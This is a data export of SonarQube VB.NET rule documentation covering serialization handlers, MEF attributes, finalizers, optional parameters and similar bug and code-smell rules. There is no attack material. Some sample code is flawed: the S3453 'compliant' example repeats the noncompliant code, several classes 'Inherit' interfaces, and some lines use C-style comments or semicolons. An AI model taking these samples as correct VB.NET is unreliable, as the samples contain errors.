<h2>Compliant Solution</h2>
<pre>
Sub DoSomething()
    ' Not implemented because of reason
End Sub

Function DoSomething()
    Throw New NotSupportedException
End Function
</pre>
<h2>Exceptions</h2>
<p>The following methods are ignored:</p>
<ul>
  <li> empty <code>Overridable</code> or <code>MustOverride</code> methods, </li>
  <li> empty methods that override an <code>MustOverride</code> method, </li>
  <li> empty overrides in test assemblies. </li>
</ul>",Methods should not be empty,[],CRITICAL,['suspicious'],CODE_SMELL
2018-11-06T12:16:58+0100,"<p>Serialization event handlers that don't have the correct signature will simply not be called, thus bypassing any attempts to augment the automated
de/serialization.</p>
<p>This rule raises issue when a method marked with one of the following attributes is not <code>private</code>, does not return <code>void</code>,
has type parameters, or does not have a single parameter of type <code>System.Runtime.Serialization.StreamingContext</code>:</p>
<ul>
  <li> <code>System.Runtime.Serialization.OnSerializingAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnSerializedAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnDeserializingAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnDeserializedAttribute</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Serializable&gt;
Public Class Foo
    &lt;OnSerializing&gt;
    Public Sub OnSerializing(ByVal context As StreamingContext) ' Noncompliant should be private
    End Sub

    &lt;OnSerialized&gt;
    Private Function OnSerialized(ByVal context As StreamingContext) As Integer '  Noncompliant should return void
    End Function

    &lt;OnDeserializing&gt;
    Private Sub OnDeserializing() ' Noncompliant should have a single parameter of type StreamingContext
    End Sub

    &lt;OnSerializing&gt;
    Public Sub OnSerializing2(Of T)(ByVal context As StreamingContext) ' Noncompliant should have no type parameters
    End Sub

    &lt;OnDeserialized&gt;
    Private Sub OnDeserialized(ByVal context As StreamingContext, ByVal str As String) ' Noncompliant should have a single parameter of type StreamingContext
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Serializable&gt;
Public Class Foo
    &lt;OnSerializing&gt;
    Private Sub OnSerializing(ByVal context As StreamingContext)
    End Sub

    &lt;OnSerialized&gt;
    Private Sub OnSerialized(ByVal context As StreamingContext)
    End Sub

    &lt;OnDeserializing&gt;
    Private Sub OnDeserializing(ByVal context As StreamingContext)
    End Sub

    &lt;OnDeserialized&gt;
    Private Sub OnDeserialized(ByVal context As StreamingContext)
    End Sub
End Class
</pre>",vbnet:S3927,vbnet,VB.NET,"<p>Serialization event handlers that don't have the correct signature will simply not be called, thus bypassing any attempts to augment the automated
de/serialization.</p>
<p>This rule raises issue when a method marked with one of the following attributes is not <code>private</code>, does not return <code>void</code>,
has type parameters, or does not have a single parameter of type <code>System.Runtime.Serialization.StreamingContext</code>:</p>
<ul>
  <li> <code>System.Runtime.Serialization.OnSerializingAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnSerializedAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnDeserializingAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnDeserializedAttribute</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Serializable&gt;
Public Class Foo
    &lt;OnSerializing&gt;
    Public Sub OnSerializing(ByVal context As StreamingContext) ' Noncompliant should be private
    End Sub

    &lt;OnSerialized&gt;
    Private Function OnSerialized(ByVal context As StreamingContext) As Integer '  Noncompliant should return void
    End Function

    &lt;OnDeserializing&gt;
    Private Sub OnDeserializing() ' Noncompliant should have a single parameter of type StreamingContext
    End Sub

    &lt;OnSerializing&gt;
    Public Sub OnSerializing2(Of T)(ByVal context As StreamingContext) ' Noncompliant should have no type parameters
    End Sub

    &lt;OnDeserialized&gt;
    Private Sub OnDeserialized(ByVal context As StreamingContext, ByVal str As String) ' Noncompliant should have a single parameter of type StreamingContext
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Serializable&gt;
Public Class Foo
    &lt;OnSerializing&gt;
    Private Sub OnSerializing(ByVal context As StreamingContext)
    End Sub

    &lt;OnSerialized&gt;
    Private Sub OnSerialized(ByVal context As StreamingContext)
    End Sub

    &lt;OnDeserializing&gt;
    Private Sub OnDeserializing(ByVal context As StreamingContext)
    End Sub

    &lt;OnDeserialized&gt;
    Private Sub OnDeserialized(ByVal context As StreamingContext)
    End Sub
End Class
</pre>",Serialization event handlers should be implemented correctly,[],MAJOR,[],BUG
2018-11-06T12:16:58+0100,"<p>Fields marked with <code>System.Runtime.Serialization.OptionalFieldAttribute</code> are serialized just like any other field. But such fields are
ignored on deserialization, and retain the default values associated with their types. Therefore, deserialization event handlers should be declared to
set such fields during the deserialization process.</p>
<p>This rule raises when at least one field with the <code>System.Runtime.Serialization.OptionalFieldAttribute</code> attribute is declared but one
(or both) of the following event handlers <code>System.Runtime.Serialization.OnDeserializingAttribute</code> or
<code>System.Runtime.Serialization.OnDeserializedAttribute</code> are not present.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Serializable&gt;
Public Class Foo ' Noncompliant
    &lt;OptionalField(VersionAdded:=2)&gt;
    Private optionalField As Integer = 5
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Serializable&gt;
Public Class Foo
    &lt;OptionalField(VersionAdded:=2)&gt;
    Private optionalField As Integer = 5

    &lt;OnDeserializing&gt;
    Private Sub OnDeserializing(ByVal context As StreamingContext)
        optionalField = 5
    End Sub

    &lt;OnDeserialized&gt;
    Private Sub OnDeserialized(ByVal context As StreamingContext)
    End Sub
End Class
</pre>",vbnet:S3926,vbnet,VB.NET,"<p>Fields marked with <code>System.Runtime.Serialization.OptionalFieldAttribute</code> are serialized just like any other field. But such fields are
ignored on deserialization, and retain the default values associated with their types. Therefore, deserialization event handlers should be declared to
set such fields during the deserialization process.</p>
<p>This rule raises when at least one field with the <code>System.Runtime.Serialization.OptionalFieldAttribute</code> attribute is declared but one
(or both) of the following event handlers <code>System.Runtime.Serialization.OnDeserializingAttribute</code> or
<code>System.Runtime.Serialization.OnDeserializedAttribute</code> are not present.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Serializable&gt;
Public Class Foo ' Noncompliant
    &lt;OptionalField(VersionAdded:=2)&gt;
    Private optionalField As Integer = 5
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Serializable&gt;
Public Class Foo
    &lt;OptionalField(VersionAdded:=2)&gt;
    Private optionalField As Integer = 5

    &lt;OnDeserializing&gt;
    Private Sub OnDeserializing(ByVal context As StreamingContext)
        optionalField = 5
    End Sub

    &lt;OnDeserialized&gt;
    Private Sub OnDeserialized(ByVal context As StreamingContext)
    End Sub
End Class
</pre>","Deserialization methods should be provided for ""OptionalField"" members",[],MAJOR,['serialization'],BUG
2018-11-06T12:16:58+0100,"<p>Having all branches in a <code>Select Case</code> or <code>If</code> chain with the same implementation is an error. Either a copy-paste error was
made and something different should be executed, or there shouldn't be a <code>Select Case</code> / <code>If</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim b As Integer = If(a &gt; 12, 4, 4)

If b = 0 Then
    DoTheThing()
Else
    DoTheThing()
End If

Select Case i
    Case 1
        DoSomething()
    Case 2
        DoSomething()
    Case 3
        DoSomething()
    Case Else
        DoSomething()
End Select
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>If</code> chains without <code>Else</code>-s, or to <code>Select Case</code>-es without <code>Case Else</code>
clauses.</p>
<pre>
If b = 0 Then ' No issue, this could have been done on purpose to make the code more readable
    DoTheThing()
ElseIf
    DoTheThing()
End If
</pre>",vbnet:S3923,vbnet,VB.NET,"<p>Having all branches in a <code>Select Case</code> or <code>If</code> chain with the same implementation is an error. Either a copy-paste error was
made and something different should be executed, or there shouldn't be a <code>Select Case</code> / <code>If</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim b As Integer = If(a &gt; 12, 4, 4)

If b = 0 Then
    DoTheThing()
Else
    DoTheThing()
End If

Select Case i
    Case 1
        DoSomething()
    Case 2
        DoSomething()
    Case 3
        DoSomething()
    Case Else
        DoSomething()
End Select
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>If</code> chains without <code>Else</code>-s, or to <code>Select Case</code>-es without <code>Case Else</code>
clauses.</p>
<pre>
If b = 0 Then ' No issue, this could have been done on purpose to make the code more readable
    DoTheThing()
ElseIf
    DoTheThing()
End If
</pre>",All branches in a conditional structure should not have exactly the same implementation,[],MAJOR,[],BUG
2018-11-06T12:16:58+0100,"<p><code>Thread.Suspend</code> and <code>Thread.Resume</code> can give unpredictable results, and both methods have been deprecated. Indeed, if
<code>Thread.Suspend</code> is not used very carefully, a thread can be suspended while holding a lock, thus leading to a deadlock. Other safer
synchronization mechanisms should be used, such as <code>Monitor</code>, <code>Mutex</code>, and <code>Semaphore</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Sub Foo()
    Thread.CurrentThread.Suspend() ' Noncompliant
    Thread.[Resume]() ' Noncompliant
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://msdn.microsoft.com/en-us/library/system.threading.thread.resume.aspx"">Thread.Resume Method ()</a> </li>
  <li> <a href=""https://msdn.microsoft.com/en-us/library/system.threading.thread.suspend(v=vs.110).aspx"">Thread.Suspend Method ()</a> </li>
</ul>",vbnet:S3889,vbnet,VB.NET,"<p><code>Thread.Suspend</code> and <code>Thread.Resume</code> can give unpredictable results, and both methods have been deprecated. Indeed, if
<code>Thread.Suspend</code> is not used very carefully, a thread can be suspended while holding a lock, thus leading to a deadlock. Other safer
synchronization mechanisms should be used, such as <code>Monitor</code>, <code>Mutex</code>, and <code>Semaphore</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Sub Foo()
    Thread.CurrentThread.Suspend() ' Noncompliant
    Thread.[Resume]() ' Noncompliant
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://msdn.microsoft.com/en-us/library/system.threading.thread.resume.aspx"">Thread.Resume Method ()</a> </li>
  <li> <a href=""https://msdn.microsoft.com/en-us/library/system.threading.thread.suspend(v=vs.110).aspx"">Thread.Suspend Method ()</a> </li>
</ul>","Neither ""Thread.Resume"" nor ""Thread.Suspend"" should be used",[],BLOCKER,"['multi-threading', 'unpredictable']",BUG
2018-11-06T12:16:58+0100,"<p>A class with only <code>private</code> constructors can't be instantiated, thus, it seems to be pointless code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Class [MyClass]
    Private Sub New() // Noncompliant
        ' ...
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Class [MyClass]
    Private Sub New()
        ' ...
    End Sub
End Class
</pre>
<h2>Exceptions</h2>
<p>Classes that themselves access their private constructors (singletons or smart enums) are ignored. Classes with only <code>static</code> members
are also ignored because they are covered by Rule S1118.</p>",vbnet:S3453,vbnet,VB.NET,"<p>A class with only <code>private</code> constructors can't be instantiated, thus, it seems to be pointless code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Class [MyClass]
    Private Sub New() // Noncompliant
        ' ...
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Class [MyClass]
    Private Sub New()
        ' ...
    End Sub
End Class
</pre>
<h2>Exceptions</h2>
<p>Classes that themselves access their private constructors (singletons or smart enums) are ignored. Classes with only <code>static</code> members
are also ignored because they are covered by Rule S1118.</p>","Classes should not have only ""private"" constructors",[],MAJOR,['design'],BUG
2018-11-06T12:16:58+0100,"<p>Calling the <code>Not</code> operator twice does nothing: the second invocation undoes the first. Either this is a bug, if the operator was
actually meant to be called once, or misleading if done on purpose.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim b As Boolean = False
Dim c As Boolean = Not Not b 'Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim b As Boolean = False
Dim c As Boolean = b 'Compliant
</pre>",vbnet:S2761,vbnet,VB.NET,"<p>Calling the <code>Not</code> operator twice does nothing: the second invocation undoes the first. Either this is a bug, if the operator was
actually meant to be called once, or misleading if done on purpose.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim b As Boolean = False
Dim c As Boolean = Not Not b 'Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim b As Boolean = False
Dim c As Boolean = b 'Compliant
</pre>",'Not' boolean operator should not be repeated,[],MAJOR,[],BUG
2018-11-06T12:16:58+0100,"<p>It may be a good idea to raise an exception in a constructor if you're unable to fully flesh the object in question, but not in an
<code>exception</code> constructor. If you do, you'll interfere with the exception that was originally being thrown. Further, it is highly unlikely
that an exception raised in the creation of an exception will be properly handled in the calling code, and the unexpected, unhandled exception will
lead to program termination.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class MyException
    Inherits Exception

    Public Sub MyException()
        If bad_thing Then
            Throw New Exception(""A bad thing happened"")
        End If
    End Sub
End Class
</pre>",vbnet:S3693,vbnet,VB.NET,"<p>It may be a good idea to raise an exception in a constructor if you're unable to fully flesh the object in question, but not in an
<code>exception</code> constructor. If you do, you'll interfere with the exception that was originally being thrown. Further, it is highly unlikely
that an exception raised in the creation of an exception will be properly handled in the calling code, and the unexpected, unhandled exception will
lead to program termination.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class MyException
    Inherits Exception

    Public Sub MyException()
        If bad_thing Then
            Throw New Exception(""A bad thing happened"")
        End If
    End Sub
End Class
</pre>",Exception constructors should not throw exceptions,[],BLOCKER,[],BUG
2018-11-06T12:16:58+0100,"<p>The <code>PartCreationPolicyAttribute</code> attribute, which is part of the Managed Extensibility Framework (MEF), is used to specify how the
exported object will be created. Therefore it doesn't make sense not to export this a class with this attribute using the <code>ExportAttribute</code>
attribute.</p>
<p>This rule raises an issue when a class is marked as shared with a <code>PartCreationPolicyAttribute</code> but lacks a
<code>ExportAttribute</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;PartCreationPolicy(CreationPolicy.Any)&gt; ' Noncompliant
Public Class FooBar
    Inherits IFooBar
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Export(GetType(IFooBar))&gt;
&lt;PartCreationPolicy(CreationPolicy.Any)&gt;
Public Class FooBar
    Inherits IFooBar
End Class
</pre>",vbnet:S4428,vbnet,VB.NET,"<p>The <code>PartCreationPolicyAttribute</code> attribute, which is part of the Managed Extensibility Framework (MEF), is used to specify how the
exported object will be created. Therefore it doesn't make sense not to export this a class with this attribute using the <code>ExportAttribute</code>
attribute.</p>
<p>This rule raises an issue when a class is marked as shared with a <code>PartCreationPolicyAttribute</code> but lacks a
<code>ExportAttribute</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;PartCreationPolicy(CreationPolicy.Any)&gt; ' Noncompliant
Public Class FooBar
    Inherits IFooBar
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Export(GetType(IFooBar))&gt;
&lt;PartCreationPolicy(CreationPolicy.Any)&gt;
Public Class FooBar
    Inherits IFooBar
End Class
</pre>","""PartCreationPolicyAttribute"" should be used with ""ExportAttribute""",[],MAJOR,"['mef', 'pitfall']",BUG
2016-11-07T15:36:18+0100,"<p>The overloading mechanism should be used in place of optional parameters for several reasons:</p>
<ul>
  <li> Optional parameter values are baked into the method call site code, thus, if a default value has been changed, all referencing assemblies need
  to be rebuilt, otherwise the original values will be used. </li>
  <li> The Common Language Specification (CLS) allows compilers to ignore default parameter values, and thus require the caller to explicitly specify
  the values. For example, if you want to consume a method with default argument from another .NET compatible language (for instance C++/CLI), you
  will have to provide all arguments. When using method overloads, you could achieve similar behavior as default arguments. </li>
  <li> Optional parameters prevent muddying the definition of the function contract. Here is a simple example: if there are two optional parameters,
  when one is defined, is the second one still optional or mandatory? </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Sub Notify(ByVal Company As String, Optional ByVal Office As String = ""QJZ"") ' Noncompliant

End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Sub Notify(ByVal Company As String)
  Notify(Company, ""QJZ"")
End Sub

Sub Notify(ByVal Company As String, ByVal Office As String)

End Sub
</pre>
<h2>Exceptions</h2>
<p>The rule ignores non externally visible methods.</p>",vbnet:S2360,vbnet,VB.NET,"<p>The overloading mechanism should be used in place of optional parameters for several reasons:</p>
<ul>
  <li> Optional parameter values are baked into the method call site code, thus, if a default value has been changed, all referencing assemblies need
  to be rebuilt, otherwise the original values will be used. </li>
  <li> The Common Language Specification (CLS) allows compilers to ignore default parameter values, and thus require the caller to explicitly specify
  the values. For example, if you want to consume a method with default argument from another .NET compatible language (for instance C++/CLI), you
  will have to provide all arguments. When using method overloads, you could achieve similar behavior as default arguments. </li>
  <li> Optional parameters prevent muddying the definition of the function contract. Here is a simple example: if there are two optional parameters,
  when one is defined, is the second one still optional or mandatory? </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Sub Notify(ByVal Company As String, Optional ByVal Office As String = ""QJZ"") ' Noncompliant

End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Sub Notify(ByVal Company As String)
  Notify(Company, ""QJZ"")
End Sub

Sub Notify(ByVal Company As String, ByVal Office As String)

End Sub
</pre>
<h2>Exceptions</h2>
<p>The rule ignores non externally visible methods.</p>",Optional parameters should not be used,[],CRITICAL,['pitfall'],CODE_SMELL
2018-11-06T12:16:58+0100,"<p>It is highly suspicious when a value is saved for a key or index and then unconditionally overwritten. Such replacements are likely in error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
towns.Item(x) = ""London""
towns.Item(x) = ""Chicago"";  // Noncompliant
</pre>",vbnet:S4143,vbnet,VB.NET,"<p>It is highly suspicious when a value is saved for a key or index and then unconditionally overwritten. Such replacements are likely in error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
towns.Item(x) = ""London""
towns.Item(x) = ""Chicago"";  // Noncompliant
</pre>",Map values should not be replaced unconditionally,[],MAJOR,['suspicious'],BUG
2018-11-06T12:16:58+0100,"<p>When creating a custom Markup Extension that accepts parameters in WPF, the <code>ConstructorArgument</code> markup must be used to identify the
discrete properties that match these parameters. However since this is done via a string, the compiler will not notice if there are typos.</p>
<p>This rule raises an issue when the string argument to <code>ConstructorArgumentAttribute</code> doesn't match any parameter of any constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Imports System

Namespace myLibrary
    Public Class MyExtension
        Inherits MarkupExtension

        Public Sub New()
        End Sub

        Public Sub New(ByVal value1 As Object)
            Value1 = value1
        End Sub

        &lt;ConstructorArgument(""value2"")&gt; ' Noncompliant
        Public Property Value1 As Object
    End Class
End Namespace
</pre>
<h2>Compliant Solution</h2>
<pre>
Imports System

Namespace MyLibrary
    Public Class MyExtension
        Inherits MarkupExtension

        Public Sub New()
        End Sub

        Public Sub New(ByVal value1 As Object)
            Value1 = value1
        End Sub

        &lt;ConstructorArgument(""value1"")&gt;
        Public Property Value1 As Object
    End Class
End Namespace
</pre>",vbnet:S4260,vbnet,VB.NET,"<p>When creating a custom Markup Extension that accepts parameters in WPF, the <code>ConstructorArgument</code> markup must be used to identify the
discrete properties that match these parameters. However since this is done via a string, the compiler will not notice if there are typos.</p>
<p>This rule raises an issue when the string argument to <code>ConstructorArgumentAttribute</code> doesn't match any parameter of any constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Imports System

Namespace myLibrary
    Public Class MyExtension
        Inherits MarkupExtension

        Public Sub New()
        End Sub

        Public Sub New(ByVal value1 As Object)
            Value1 = value1
        End Sub

        &lt;ConstructorArgument(""value2"")&gt; ' Noncompliant
        Public Property Value1 As Object
    End Class
End Namespace
</pre>
<h2>Compliant Solution</h2>
<pre>
Imports System

Namespace MyLibrary
    Public Class MyExtension
        Inherits MarkupExtension

        Public Sub New()
        End Sub

        Public Sub New(ByVal value1 As Object)
            Value1 = value1
        End Sub

        &lt;ConstructorArgument(""value1"")&gt;
        Public Property Value1 As Object
    End Class
End Namespace
</pre>","""ConstructorArgument"" parameters should exist in constructors",[],MAJOR,"['wpf', 'xaml']",BUG
2018-11-06T12:16:58+0100,"<p>In the Attributed Programming Model, the <code>ExportAttribute</code> declares that a part ""exports"", or provides to the composition container, an
object that fulfills a particular contract. During composition, parts with imports that have matching contracts will have those dependencies filled by
the exported object.</p>
<p>If the type doesn't implement the interface it is exporting there will be an issue at runtime (either a cast exception or just a container not
filled with the exported type) leading to unexpected behaviors/crashes.</p>
<p>The rule raises an issue when a class doesn't implement or inherit the type declared in the <code>ExportAttribute</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Export(GetType(ISomeType))&gt;
Public Class SomeType  // Noncompliant; doesn't implement 'ISomeType'.
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Export(GetType(ISomeType))&gt;
Public Class SomeType
    Inherits ISomeType
End Class
</pre>",vbnet:S4159,vbnet,VB.NET,"<p>In the Attributed Programming Model, the <code>ExportAttribute</code> declares that a part ""exports"", or provides to the composition container, an
object that fulfills a particular contract. During composition, parts with imports that have matching contracts will have those dependencies filled by
the exported object.</p>
<p>If the type doesn't implement the interface it is exporting there will be an issue at runtime (either a cast exception or just a container not
filled with the exported type) leading to unexpected behaviors/crashes.</p>
<p>The rule raises an issue when a class doesn't implement or inherit the type declared in the <code>ExportAttribute</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Export(GetType(ISomeType))&gt;
Public Class SomeType  // Noncompliant; doesn't implement 'ISomeType'.
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Export(GetType(ISomeType))&gt;
Public Class SomeType
    Inherits ISomeType
End Class
</pre>","Classes should implement their ""ExportAttribute"" interfaces",[],BLOCKER,"['mef', 'pitfall']",BUG
2018-11-06T12:16:58+0100,"<p>If Finalize or an override of Finalize throws an exception, and the runtime is not hosted by an application that overrides the default policy, the
runtime terminates the process immediately without graceful cleanup (finally blocks and finalizers are not executed). This behavior ensures process
integrity if the finalizer cannot free or destroy resources.</p>
<p>The rule reports on throw statements used in finalizers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class MyClass
    Protected Overrides Sub Finalize()
        Throw New NotImplementedException() ' Noncompliant
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class MyClass
    Protected Overrides Sub Finalize()
        ' No throw
    End Sub
End Class
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-5-1 - A class destructor shall not exit with an exception. </li>
</ul>",vbnet:S1048,vbnet,VB.NET,"<p>If Finalize or an override of Finalize throws an exception, and the runtime is not hosted by an application that overrides the default policy, the
runtime terminates the process immediately without graceful cleanup (finally blocks and finalizers are not executed). This behavior ensures process
integrity if the finalizer cannot free or destroy resources.</p>
<p>The rule reports on throw statements used in finalizers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class MyClass
    Protected Overrides Sub Finalize()
        Throw New NotImplementedException() ' Noncompliant
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class MyClass
    Protected Overrides Sub Finalize()
        ' No throw
    End Sub
End Class
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-5-1 - A class destructor shall not exit with an exception. </li>
</ul>",Finalizers should not throw exceptions,[],BLOCKER,['misra'],BUG
2018-11-06T12:16:58+0100,"<p>Generally, writing the least code that will <em>readably</em> do the job is a good thing, so omitting default parameter values seems to make sense.
Unfortunately, when you omit them from the <code>base</code> call in an override, you're not actually getting the job done thoroughly, because you're
ignoring the value the caller passed in. The result will likely not be what the caller expected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Class BaseClass
    Public Overridable Sub MyMethod(ByVal Optional i As Integer = 1)
        Console.WriteLine(i)
    End Sub
End Class

Public Class DerivedClass
    Inherits BaseClass

    Public Overrides Sub MyMethod(ByVal Optional i As Integer = 1)
        ' ...
        MyBase.MyMethod() ' Noncompliant; caller's value is ignored
    End Sub

    Private Shared Function Main(ByVal args As String()) As Integer
        Dim dc As DerivedClass = New DerivedClass()
        dc.MyMethod(12) ' prints 1
    End Function
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Class BaseClass
    Public Overridable Sub MyMethod(ByVal Optional i As Integer = 1)
        Console.WriteLine(i)
    End Sub
End Class

Public Class DerivedClass
    Inherits BaseClass

    Public Overrides Sub MyMethod(ByVal Optional i As Integer = 1)
        ' ...
        MyBase.MyMethod(i)
    End Sub

    Private Shared Function Main(ByVal args As String()) As Integer
        Dim dc As DerivedClass = New DerivedClass()
        dc.MyMethod(12) ' prints 12
    End Function
End Class

</pre>",vbnet:S3466,vbnet,VB.NET,"<p>Generally, writing the least code that will <em>readably</em> do the job is a good thing, so omitting default parameter values seems to make sense.
Unfortunately, when you omit them from the <code>base</code> call in an override, you're not actually getting the job done thoroughly, because you're
ignoring the value the caller passed in. The result will likely not be what the caller expected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Class BaseClass
    Public Overridable Sub MyMethod(ByVal Optional i As Integer = 1)
        Console.WriteLine(i)
    End Sub
End Class

Public Class DerivedClass
    Inherits BaseClass

    Public Overrides Sub MyMethod(ByVal Optional i As Integer = 1)
        ' ...
        MyBase.MyMethod() ' Noncompliant; caller's value is ignored
    End Sub

    Private Shared Function Main(ByVal args As String()) As Integer
        Dim dc As DerivedClass = New DerivedClass()
        dc.MyMethod(12) ' prints 1
    End Function
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Class BaseClass
    Public Overridable Sub MyMethod(ByVal Optional i As Integer = 1)
        Console.WriteLine(i)
    End Sub
End Class

Public Class DerivedClass
    Inherits BaseClass

    Public Overrides Sub MyMethod(ByVal Optional i As Integer = 1)
        ' ...
        MyBase.MyMethod(i)
    End Sub

    Private Shared Function Main(ByVal args As String()) As Integer
        Dim dc As DerivedClass = New DerivedClass()
        dc.MyMethod(12) ' prints 12
    End Function
End Class

</pre>","Optional parameters should be passed to ""base"" calls",[],MAJOR,[],BUG
2018-11-06T12:16:58+0100,"<p>Recursion is acceptable in methods, where you can break out of it. But with class types, you end up with code that will compile but not run if you
try to instantiate the class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class C1(Of T)
End Class
Class C2(Of T)
    Inherits C1(Of C2 (Of T))
End Class
' ...
Dim c2 = New C2(Of Integer)
</pre>",vbnet:S3464,vbnet,VB.NET,"<p>Recursion is acceptable in methods, where you can break out of it. But with class types, you end up with code that will compile but not run if you
try to instantiate the class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class C1(Of T)
End Class
Class C2(Of T)
    Inherits C1(Of C2 (Of T))
End Class
' ...
Dim c2 = New C2(Of Integer)
</pre>",Type inheritance should not be recursive,[],BLOCKER,[],BUG
2018-11-06T12:16:58+0100,"<p>Marking a class with <code>PartCreationPolicy(CreationPolicy.Shared)</code>, which is part of Managed Extensibility Framework (MEF), means that a
single, shared instance of the exported object will be created. Therefore it doesn't make sense to create new instances using the constructor and it
will most likely result in unexpected behaviours.</p>
<p>This rule raises an issue when a constructor of a class marked shared with a <code>PartCreationPolicyAttribute</code> is invoked.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Export(GetType(IFooBar))&gt;
&lt;PartCreationPolicy(CreationPolicy.[Shared])&gt;
Public Class FooBar
    Inherits IFooBar
End Class

Public Class Program
    Public Shared Sub Main()
        Dim fooBar = New FooBar() ' Noncompliant
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Export(GetType(IFooBar))&gt;
&lt;PartCreationPolicy(CreationPolicy.[Shared])&gt;
Public Class FooBar
    Inherits IFooBar
End Class

Public Class Program
    Public Shared Sub Main()
        Dim fooBar = serviceProvider.GetService(Of IFooBar)()
    End Sub
End Class
</pre>",vbnet:S4277,vbnet,VB.NET,"<p>Marking a class with <code>PartCreationPolicy(CreationPolicy.Shared)</code>, which is part of Managed Extensibility Framework (MEF), means that a
single, shared instance of the exported object will be created. Therefore it doesn't make sense to create new instances using the constructor and it
will most likely result in unexpected behaviours.</p>
<p>This rule raises an issue when a constructor of a class marked shared with a <code>PartCreationPolicyAttribute</code> is invoked.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Export(GetType(IFooBar))&gt;
&lt;PartCreationPolicy(CreationPolicy.[Shared])&gt;
Public Class FooBar
    Inherits IFooBar
End Class

Public Class Program
    Public Shared Sub Main()
        Dim fooBar = New FooBar() ' Noncompliant
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Export(GetType(IFooBar))&gt;
&lt;PartCreationPolicy(CreationPolicy.[Shared])&gt;
Public Class FooBar
    Inherits IFooBar
End Class

Public Class Program
    Public Shared Sub Main()
        Dim fooBar = serviceProvider.GetService(Of IFooBar)()
    End Sub
End Class
</pre>","""Shared"" parts should not be created with ""new""",[],CRITICAL,"['mef', 'pitfall']",BUG
2018-11-06T12:16:58+0100,"<p>Types are declared in namespaces in order to prevent name collisions and as a way to organize them into the object hierarchy. Types that are
defined outside any named namespace are in a global namespace that cannot be referenced in code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Class Foo
End Class

Public Structure Bar
End Structure
</pre>
<h2>Compliant Solution</h2>
<pre>
Namespace SomeSpace
    Public Class Foo
    End Class

    Public Structure Bar
    End Structure
End Namespace
</pre>",vbnet:S3903,vbnet,VB.NET,"<p>Types are declared in namespaces in order to prevent name collisions and as a way to organize them into the object hierarchy. Types that are
defined outside any named namespace are in a global namespace that cannot be referenced in code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Class Foo
End Class

Public Structure Bar
End Structure
</pre>
<h2>Compliant Solution</h2>
<pre>
Namespace SomeSpace
    Public Class Foo
    End Class

    Public Structure Bar
    End Structure
End Namespace
</pre>",Types should be defined in named namespaces,[],MAJOR,[],BUG
